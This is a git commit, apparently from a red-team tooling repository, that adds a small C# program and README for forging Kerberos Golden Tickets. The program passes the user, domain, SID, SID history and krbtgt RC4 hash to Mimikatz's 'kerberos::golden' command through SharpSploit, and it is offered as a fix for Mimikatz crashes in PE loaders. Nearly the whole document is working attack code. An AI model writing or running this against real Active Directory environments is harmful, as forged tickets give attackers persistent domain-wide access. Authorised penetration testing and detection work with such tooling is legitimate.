4f8dc0a8e5e184b9df4233b7a6660309057fe6ed
Rasta Mouse <rasta@rastamouse.me>
2019-10-07 13:59:36 +0100

    Commit Assembly

---
+++ GoldenTicket/Program.cs
@@ -0,0 +1,29 @@
+﻿using System;
+
+using SharpSploit.Credentials;
+
+namespace GoldenTicket
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            if (args.Length != 5)
+            {
+                Console.Error.WriteLine("Incorrect number of arguments");
+                Console.Error.WriteLine("Usage: GoldenTicket.exe <User> <Domain> <SID> <SIDHistory> <RC4>");
+                return;
+            }
+            try
+            {
+                var cmd = $"\"kerberos::golden /user:{args[0]} /domain:{args[1]} /sid:{args[2]} /sids:{args[3]} /krbtgt:{args[4]}\" \"exit\"";
+                var mimi = Mimikatz.Command(cmd);
+                Console.WriteLine(mimi);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+        }
+    }
+}
--- README.md
+++ README.md
@@ -1,1 +1,10 @@
 # GoldenTicket
+ 
+This .NET assembly is specifically designed for creating Golden Tickets.  It has been built with a custom version of SharpSploit and an old 2.0 alpha (x64) version of Powerkatz.
+
+This was a quick solution to the crashing that occurs with later versions of Mimi/Powerkatz in PE Loaders.
+
+## Usage:
+```
+GoldenTicket.exe <username> <domain> <sid> <sids> <krbtgt>
+```
